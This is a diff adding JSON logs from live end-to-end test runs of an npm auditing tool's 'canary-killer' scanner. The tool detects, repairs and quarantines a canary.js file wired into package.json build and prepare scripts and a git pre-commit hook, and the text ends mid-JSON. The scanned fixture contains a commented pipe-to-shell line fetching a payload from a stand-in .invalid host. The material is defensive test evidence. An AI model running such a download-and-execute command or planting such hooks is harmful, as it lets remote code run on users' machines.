@@ -1,0 +1,308 @@
+{
+  "revision": "94fc955c70f0114c1af4fbcd5f7e40c2b8a8efda",
+  "node": "v24.16.0",
+  "npm": "11.13.0",
+  "test": "E:\\np-audit\\test\\e2e\\canary-protection-live.test.js",
+  "testSha256": "0148c741ab0f2670be98a40e912668c4559fbaf1ed9db2da81fc51114d19f247",
+  "method": "Committed live test with observation logging added in memory. Application code and process launches were not mocked. Real npm ran offline with scripts disabled. Test project directories were deleted by the test after assertions.",
+  "assertions": "All committed live-test assertions passed",
+  "runs": [
+    {
+      "root": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-live-protection-tjPext\\project-0",
+      "args": [
+        "canary-killer",
+        "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-live-protection-tjPext\\project-0",
+        "--json"
+      ],
+      "exit": 2,
+      "stdout": "{\n  \"scan\": \"canary-killer\",\n  \"roots\": [\n    \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-0\"\n  ],\n  \"complete\": false,\n  \"findings\": [\n    {\n      \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-0\\\\.git\\\\hooks\\\\pre-commit\",\n      \"line\": 2,\n      \"evidence\": \"node canary.js\",\n      \"evidenceTruncated\": false,\n      \"name\": \"canary-indicator\",\n      \"severity\": \"indicator\",\n      \"detail\": \"Text references canary.js; the name alone does not establish malicious behavior.\"\n    },\n    {\n      \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-0\\\\canary.js\",\n      \"line\": 1,\n      \"evidence\": \"// inert incident-derived reconstruction; never execute\",\n      \"evidenceTruncated\": false,\n      \"name\": \"canary-indicator\",\n      \"severity\": \"indicator\",\n      \"detail\": \"File is named canary.js; inspect behavior independently of its name.\"\n    },\n    {\n      \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-0\\\\canary.js\",\n      \"line\": 2,\n      \"evidence\": \"// curl http://live-check.invalid/payload | bash\",\n      \"evidenceTruncated\": false,\n      \"name\": \"remote-to-shell\",\n      \"severity\": \"review\",\n      \"detail\": \"Download command, possibly continued across lines, is piped to a shell; fetched content is not retrieved or verified.\"\n    },\n    {\n      \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-0\\\\package.json\",\n      \"line\": 6,\n      \"evidence\": \"    \\\"build\\\": \\\"node canary.js && tsc\\\",\",\n      \"evidenceTruncated\": false,\n      \"name\": \"canary-indicator\",\n      \"severity\": \"indicator\",\n      \"detail\": \"Text references canary.js; the name alone does not establish malicious behavior.\"\n    },\n    {\n      \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-0\\\\package.json\",\n      \"line\": 7,\n      \"evidence\": \"    \\\"prepare\\\": \\\"node canary.js\\\"\",\n      \"evidenceTruncated\": false,\n      \"name\": \"canary-indicator\",\n      \"severity\": \"indicator\",\n      \"detail\": \"Text references canary.js; the name alone does not establish malicious behavior.\"\n    }\n  ],\n  \"references\": [\n    {\n      \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-0\\\\.git\\\\hooks\\\\pre-commit\",\n      \"line\": 2,\n      \"evidence\": \"node canary.js\",\n      \"evidenceTruncated\": false,\n      \"reference\": \"canary.js\",\n      \"target\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-0\\\\canary.js\",\n      \"status\": \"exists\"\n    },\n    {\n      \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-0\\\\package.json\",\n      \"line\": 6,\n      \"evidence\": \"    \\\"build\\\": \\\"node canary.js && tsc\\\",\",\n      \"evidenceTruncated\": false,\n      \"reference\": \"canary.js\",\n      \"target\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-0\\\\canary.js\",\n      \"status\": \"exists\"\n    },\n    {\n      \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-0\\\\package.json\",\n      \"line\": 7,\n      \"evidence\": \"    \\\"prepare\\\": \\\"node canary.js\\\"\",\n      \"evidenceTruncated\": false,\n      \"reference\": \"canary.js\",\n      \"target\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-0\\\\canary.js\",\n      \"status\": \"exists\"\n    }\n  ],\n  \"unreadable\": [],\n  \"exclusions\": [\n    {\n      \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-0\\\\.git\",\n      \"reason\": \"Git metadata other than config, config.worktree, commondir and hooks is not analyzed\"\n    }\n  ],\n  \"unresolved\": [\n    {\n      \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-0\\\\package.json\",\n      \"reason\": \"Command entry point is not statically resolved\",\n      \"line\": 6,\n      \"evidence\": \"    \\\"build\\\": \\\"node canary.js && tsc\\\",\",\n      \"evidenceTruncated\": false,\n      \"command\": \"tsc\"\n    }\n  ],\n  \"coverage\": {\n    \"files\": [\n      \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-0\\\\.git\\\\config\",\n      \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-0\\\\.git\\\\hooks\\\\pre-commit\",\n      \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-0\\\\.npmauditor.json\",\n      \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-0\\\\canary.js\",\n      \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-0\\\\package.json\"\n    ],\n    \"canaryFiles\": [\n      {\n        \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-0\\\\canary.js\"\n      }\n    ],\n    \"repositories\": [\n      {\n        \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-0\"\n      }\n    ],\n    \"entries\": 8,\n    \"bytes\": 386,\n    \"gitConfigs\": [\n      {\n        \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-0\\\\.git\\\\config\"\n      }\n    ],\n    \"hookDirectories\": [\n      {\n        \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-0\\\\.git\\\\hooks\",\n        \"configuredBy\": \"default\"\n      }\n    ]\n  },\n  \"limits\": {\n    \"files\": 10000,\n    \"entries\": 20000,\n    \"fileBytes\": 1048576,\n    \"totalBytes\": 33554432,\n    \"records\": 2000,\n    \"depth\": 100\n  },\n  \"limitations\": [\n    \"Static text heuristics can match comments, strings and legitimate tools; matches are not malware verdicts.\",\n    \"No scripts, hooks, Git commands, downloads or repository-configured external commands are executed.\",\n    \"Only supplied local roots are inspected, including untracked files present there. A GitHub checkout cannot inspect other machines or their local .git/hooks.\",\n    \"System/global Git configuration and environment overrides are not inferred. Conditional includes and dynamic commands remain unresolved.\",\n    \"This scan cannot establish host integrity, recover deleted contents, attribute an incident or reconstruct a previously executed payload.\"\n  ],\n  \"summary\": {\n    \"status\": \"incomplete\",\n    \"files\": 5,\n    \"findings\": 5,\n    \"unresolved\": 1,\n    \"unreadable\": 0,\n    \"exclusions\": 1\n  }\n}\n",
+      "stderr": "",
+      "before": {
+        "canaryPresent": true,
+        "scripts": {
+          "build": "node canary.js && tsc",
+          "prepare": "node canary.js"
+        },
+        "staleMarkerPresent": false,
+        "lockfilePresent": false
+      },
+      "after": {
+        "canaryPresent": true,
+        "scripts": {
+          "build": "node canary.js && tsc",
+          "prepare": "node canary.js"
+        },
+        "hook": "#!/bin/sh\nnode canary.js\necho preserved\n",
+        "ignore": null,
+        "staleMarkerPresent": false,
+        "lockfilePresent": false,
+        "quarantine": []
+      }
+    },
+    {
+      "root": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-live-protection-tjPext\\project-0",
+      "args": [
+        "canary-killer",
+        "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-live-protection-tjPext\\project-0",
+        "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-live-protection-tjPext\\residue\\dev\\shm",
+        "--quarantine",
+        "--json"
+      ],
+      "exit": 2,
+      "stdout": "{\n  \"scan\": \"canary-killer\",\n  \"roots\": [\n    \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-0\",\n    \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\residue\\\\dev\\\\shm\"\n  ],\n  \"complete\": false,\n  \"findings\": [\n    {\n      \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-0\\\\.gitignore\",\n      \"line\": 2,\n      \"evidence\": \"canary.js\",\n      \"evidenceTruncated\": false,\n      \"name\": \"canary-indicator\",\n      \"severity\": \"indicator\",\n      \"detail\": \"Text references canary.js; the name alone does not establish malicious behavior.\"\n    },\n    {\n      \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\residue\\\\dev\\\\shm\\\\.gitignore\",\n      \"line\": 2,\n      \"evidence\": \"canary.js\",\n      \"evidenceTruncated\": false,\n      \"name\": \"canary-indicator\",\n      \"severity\": \"indicator\",\n      \"detail\": \"Text references canary.js; the name alone does not establish malicious behavior.\"\n    }\n  ],\n  \"references\": [],\n  \"unreadable\": [],\n  \"exclusions\": [\n    {\n      \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-0\\\\.git\",\n      \"reason\": \"Git metadata other than config, config.worktree, commondir and hooks is not analyzed\"\n    },\n    {\n      \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-0\\\\.np-audit-quarantine\",\n      \"reason\": \"Quarantine storage is not analyzed\"\n    },\n    {\n      \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\residue\\\\dev\\\\shm\\\\.np-audit-quarantine\",\n      \"reason\": \"Quarantine storage is not analyzed\"\n    }\n  ],\n  \"unresolved\": [\n    {\n      \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-0\\\\package.json\",\n      \"reason\": \"Command entry point is not statically resolved\",\n      \"line\": 6,\n      \"evidence\": \"    \\\"build\\\": \\\"tsc\\\"\",\n      \"evidenceTruncated\": false,\n      \"command\": \"tsc\"\n    }\n  ],\n  \"coverage\": {\n    \"files\": [\n      \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-0\\\\.git\\\\config\",\n      \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-0\\\\.git\\\\hooks\\\\pre-commit\",\n      \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-0\\\\.gitignore\",\n      \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-0\\\\.npmauditor.json\",\n      \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-0\\\\package.json\",\n      \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\residue\\\\dev\\\\shm\\\\.gitignore\"\n    ],\n    \"canaryFiles\": [],\n    \"repositories\": [\n      {\n        \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-0\"\n      }\n    ],\n    \"entries\": 10,\n    \"bytes\": 351,\n    \"gitConfigs\": [\n      {\n        \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-0\\\\.git\\\\config\"\n      }\n    ],\n    \"hookDirectories\": [\n      {\n        \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-0\\\\.git\\\\hooks\",\n        \"configuredBy\": \"default\"\n      }\n    ]\n  },\n  \"limits\": {\n    \"files\": 10000,\n    \"entries\": 20000,\n    \"fileBytes\": 1048576,\n    \"totalBytes\": 33554432,\n    \"records\": 2000,\n    \"depth\": 100\n  },\n  \"limitations\": [\n    \"Static text heuristics can match comments, strings and legitimate tools; matches are not malware verdicts.\",\n    \"No scripts, hooks, Git commands, downloads or repository-configured external commands are executed.\",\n    \"Only supplied local roots are inspected, including untracked files present there. A GitHub checkout cannot inspect other machines or their local .git/hooks.\",\n    \"System/global Git configuration and environment overrides are not inferred. Conditional includes and dynamic commands remain unresolved.\",\n    \"This scan cannot establish host integrity, recover deleted contents, attribute an incident or reconstruct a previously executed payload.\"\n  ],\n  \"summary\": {\n    \"status\": \"incomplete\",\n    \"files\": 6,\n    \"findings\": 2,\n    \"unresolved\": 1,\n    \"unreadable\": 0,\n    \"exclusions\": 3\n  },\n  \"repairs\": {\n    \"actionsComplete\": true,\n    \"actions\": [\n      {\n        \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-0\\\\.git\\\\hooks\\\\pre-commit\",\n        \"line\": 2,\n        \"evidence\": \"node canary.js\",\n        \"evidenceTruncated\": false,\n        \"before\": \"node canary.js\",\n        \"after\": null,\n        \"targets\": [\n          \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-0\\\\canary.js\"\n        ]\n      },\n      {\n        \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-0\\\\package.json\",\n        \"line\": 7,\n        \"evidence\": \"    \\\"prepare\\\": \\\"node canary.js\\\"\",\n        \"evidenceTruncated\": false,\n        \"script\": \"prepare\",\n        \"before\": \"node canary.js\",\n        \"after\": null,\n        \"targets\": [\n          \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-0\\\\canary.js\"\n        ]\n      },\n      {\n        \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-0\\\\package.json\",\n        \"line\": 6,\n        \"evidence\": \"    \\\"build\\\": \\\"node canary.js && tsc\\\",\",\n        \"evidenceTruncated\": false,\n        \"script\": \"build\",\n        \"before\": \"node canary.js && tsc\",\n        \"after\": \"tsc\",\n        \"targets\": [\n          \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-0\\\\canary.js\"\n        ]\n      }\n    ],\n    \"failures\": [],\n    \"ignoreRoots\": [\n      \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-0\"\n    ]\n  },\n  \"quarantine\": {\n    \"actionsComplete\": true,\n    \"actions\": [\n      {\n        \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-0\\\\canary.js\",\n        \"status\": \"quarantined\",\n        \"ignore\": {\n          \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-0\\\\.gitignore\",\n          \"status\": \"updated\"\n        },\n        \"target\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-0\\\\.np-audit-quarantine\\\\entry-vwNkia\\\\payload.quarantined\",\n        \"metadata\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-0\\\\.np-audit-quarantine\\\\entry-vwNkia\\\\metadata.json\"\n      },\n      {\n        \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\residue\\\\dev\\\\shm\\\\canary.js\",\n        \"status\": \"quarantined\",\n        \"ignore\": {\n          \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\residue\\\\dev\\\\shm\\\\.gitignore\",\n          \"status\": \"updated\"\n        },\n        \"target\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\residue\\\\dev\\\\shm\\\\.np-audit-quarantine\\\\entry-pzbP5R\\\\payload.quarantined\",\n        \"metadata\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\residue\\\\dev\\\\shm\\\\.np-audit-quarantine\\\\entry-pzbP5R\\\\metadata.json\"\n      }\n    ],\n    \"excludedStorage\": [\n      \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-0\\\\.np-audit-quarantine\",\n      \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\residue\\\\dev\\\\shm\\\\.np-audit-quarantine\"\n    ],\n    \"ignoreUpdates\": [\n      {\n        \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-0\\\\.gitignore\",\n        \"status\": \"updated\"\n      },\n      {\n        \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\residue\\\\dev\\\\shm\\\\.gitignore\",\n        \"status\": \"updated\"\n      }\n    ],\n    \"ignoreFailures\": [],\n    \"before\": {\n      \"summary\": {\n        \"status\": \"incomplete\",\n        \"files\": 6,\n        \"findings\": 7,\n        \"unresolved\": 1,\n        \"unreadable\": 0,\n        \"exclusions\": 1\n      },\n      \"unreadable\": [],\n      \"exclusions\": [\n        {\n          \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-0\\\\.git\",\n          \"reason\": \"Git metadata other than config, config.worktree, commondir and hooks is not analyzed\"\n        }\n      ],\n      \"unresolved\": [\n        {\n          \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-0\\\\package.json\",\n          \"reason\": \"Command entry point is not statically resolved\",\n          \"line\": 6,\n          \"evidence\": \"    \\\"build\\\": \\\"node canary.js && tsc\\\",\",\n          \"evidenceTruncated\": false,\n          \"command\": \"tsc\"\n        }\n      ]\n    },\n    \"evidence\": [\n      {\n        \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-0\\\\canary.js\",\n        \"line\": 1,\n        \"evidence\": \"// inert incident-derived reconstruction; never execute\",\n        \"evidenceTruncated\": false,\n        \"name\": \"canary-indicator\",\n        \"severity\": \"indicator\",\n        \"detail\": \"File is named canary.js; inspect behavior independently of its name.\"\n      },\n      {\n        \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-0\\\\canary.js\",\n        \"line\": 2,\n        \"evidence\": \"// curl http://live-check.invalid/payload | bash\",\n        \"evidenceTruncated\": false,\n        \"name\": \"remote-to-shell\",\n        \"severity\": \"review\",\n        \"detail\": \"Download command, possibly continued across lines, is piped to a shell; fetched content is not retrieved or verified.\"\n      },\n      {\n        \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\residue\\\\dev\\\\shm\\\\canary.js\",\n        \"line\": 1,\n        \"evidence\": \"// inert incident-derived reconstruction; never execute\",\n        \"evidenceTruncated\": false,\n        \"name\": \"canary-indicator\",\n        \"severity\": \"indicator\",\n        \"detail\": \"File is named canary.js; inspect behavior independently of its name.\"\n      },\n      {\n        \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\residue\\\\dev\\\\shm\\\\canary.js\",\n        \"line\": 2,\n        \"evidence\": \"// curl http://live-check.invalid/payload | bash\",\n        \"evidenceTruncated\": false,\n        \"name\": \"remote-to-shell\",\n        \"severity\": \"review\",\n        \"detail\": \"Download command, possibly continued across lines, is piped to a shell; fetched content is not retrieved or verified.\"\n      }\n    ]\n  },\n  \"protection\": {\n    \"allowed\": true,\n    \"failures\": []\n  }\n}\n",
+      "stderr": "",
+      "before": {
+        "canaryPresent": true,
+        "scripts": {
+          "build": "node canary.js && tsc",
+          "prepare": "node canary.js"
+        },
+        "staleMarkerPresent": false,
+        "lockfilePresent": false
+      },
+      "after": {
+        "canaryPresent": false,
+        "scripts": {
+          "build": "tsc"
+        },
+        "hook": "#!/bin/sh\necho preserved\n",
+        "ignore": "# np-audit Canary Killer quarantine\ncanary.js\n.np-audit-quarantine/\n",
+        "staleMarkerPresent": false,
+        "lockfilePresent": false,
+        "quarantine": [
+          {
+            "target": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-live-protection-tjPext\\project-0\\.np-audit-quarantine\\entry-vwNkia\\payload.quarantined",
+            "sha256": "c6dcd3d37694570fe3ee92908569f4d22072f01a64d3d12aaa7346c5bd3f9b5d",
+            "content": "// inert incident-derived reconstruction; never execute\n// curl http://live-check.invalid/payload | bash\n"
+          }
+        ]
+      }
+    },
+    {
+      "root": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-live-protection-tjPext\\project-1",
+      "args": [
+        "prefix"
+      ],
+      "exit": 0,
+      "stdout": "ℹ Canary protection: 1 files quarantined; 3 references repaired\nC:\\Users\\tionn\\AppData\\Local\\Temp\\npa-live-protection-tjPext\\project-1\n",
+      "stderr": "",
+      "before": {
+        "canaryPresent": true,
+        "scripts": {
+          "build": "node canary.js && tsc",
+          "prepare": "node canary.js"
+        },
+        "staleMarkerPresent": false,
+        "lockfilePresent": false
+      },
+      "after": {
+        "canaryPresent": false,
+        "scripts": {
+          "build": "tsc"
+        },
+        "hook": "#!/bin/sh\necho preserved\n",
+        "ignore": "# np-audit Canary Killer quarantine\ncanary.js\n.np-audit-quarantine/\n",
+        "staleMarkerPresent": false,
+        "lockfilePresent": false,
+        "quarantine": [
+          {
+            "target": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-live-protection-tjPext\\project-1\\.np-audit-quarantine\\entry-AzoEXj\\payload.quarantined",
+            "sha256": "c6dcd3d37694570fe3ee92908569f4d22072f01a64d3d12aaa7346c5bd3f9b5d",
+            "content": "// inert incident-derived reconstruction; never execute\n// curl http://live-check.invalid/payload | bash\n"
+          }
+        ]
+      }
+    },
+    {
+      "root": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-live-protection-tjPext\\project-2",
+      "args": [
+        "scan",
+        "--json"
+      ],
+      "exit": 0,
+      "stdout": "{\n  \"protection\": {\n    \"scan\": \"canary-killer\",\n    \"roots\": [\n      \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-2\"\n    ],\n    \"complete\": false,\n    \"findings\": [],\n    \"references\": [],\n    \"unreadable\": [],\n    \"exclusions\": [\n      {\n        \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-2\\\\.git\",\n        \"reason\": \"Git metadata other than config, config.worktree, commondir and hooks is not analyzed\"\n      },\n      {\n        \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-2\\\\.np-audit-quarantine\",\n        \"reason\": \"Quarantine storage is not analyzed\"\n      }\n    ],\n    \"unresolved\": [\n      {\n        \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-2\\\\package.json\",\n        \"reason\": \"Command entry point is not statically resolved\",\n        \"line\": 6,\n        \"evidence\": \"    \\\"build\\\": \\\"tsc\\\"\",\n        \"evidenceTruncated\": false,\n        \"command\": \"tsc\"\n      }\n    ],\n    \"coverage\": {\n      \"files\": [\n        \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-2\\\\.git\\\\config\",\n        \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-2\\\\.git\\\\hooks\\\\pre-commit\",\n        \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-2\\\\package.json\"\n      ],\n      \"canaryFiles\": [],\n      \"repositories\": [\n        {\n          \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-2\"\n        }\n      ],\n      \"entries\": 8,\n      \"bytes\": 147,\n      \"gitConfigs\": [\n        {\n          \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-2\\\\.git\\\\config\"\n        }\n      ],\n      \"hookDirectories\": [\n        {\n          \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-2\\\\.git\\\\hooks\",\n          \"configuredBy\": \"default\"\n        }\n      ],\n      \"filenameOnlyFiles\": [\n        \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-2\\\\.gitignore\",\n        \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-2\\\\.npmauditor.json\"\n      ]\n    },\n    \"limits\": {\n      \"files\": 10000,\n      \"entries\": 20000,\n      \"fileBytes\": 1048576,\n      \"totalBytes\": 33554432,\n      \"records\": 2000,\n      \"depth\": 100\n    },\n    \"limitations\": [\n      \"Static text heuristics can match comments, strings and legitimate tools; matches are not malware verdicts.\",\n      \"No scripts, hooks, Git commands, downloads or repository-configured external commands are executed.\",\n      \"Only supplied local roots are inspected, including untracked files present there. A GitHub checkout cannot inspect other machines or their local .git/hooks.\",\n      \"System/global Git configuration and environment overrides are not inferred. Conditional includes and dynamic commands remain unresolved.\",\n      \"This scan cannot establish host integrity, recover deleted contents, attribute an incident or reconstruct a previously executed payload.\",\n      \"Protection checks all discovered filenames; content inspection is limited to manifests, Git config/hooks and canary.js. Filename-only paths are listed separately.\"\n    ],\n    \"summary\": {\n      \"status\": \"incomplete\",\n      \"files\": 3,\n      \"findings\": 0,\n      \"unresolved\": 1,\n      \"unreadable\": 0,\n      \"exclusions\": 2\n    },\n    \"repairs\": {\n      \"actionsComplete\": true,\n      \"actions\": [\n        {\n          \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-2\\\\.git\\\\hooks\\\\pre-commit\",\n          \"line\": 2,\n          \"evidence\": \"node canary.js\",\n          \"evidenceTruncated\": false,\n          \"before\": \"node canary.js\",\n          \"after\": null,\n          \"targets\": [\n            \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-2\\\\canary.js\"\n          ]\n        },\n        {\n          \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-2\\\\package.json\",\n          \"line\": 7,\n          \"evidence\": \"    \\\"prepare\\\": \\\"node canary.js\\\"\",\n          \"evidenceTruncated\": false,\n          \"script\": \"prepare\",\n          \"before\": \"node canary.js\",\n          \"after\": null,\n          \"targets\": [\n            \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-2\\\\canary.js\"\n          ]\n        },\n        {\n          \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-2\\\\package.json\",\n          \"line\": 6,\n          \"evidence\": \"    \\\"build\\\": \\\"node canary.js && tsc\\\",\",\n          \"evidenceTruncated\": false,\n          \"script\": \"build\",\n          \"before\": \"node canary.js && tsc\",\n          \"after\": \"tsc\",\n          \"targets\": [\n            \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-2\\\\canary.js\"\n          ]\n        }\n      ],\n      \"failures\": [],\n      \"ignoreRoots\": [\n        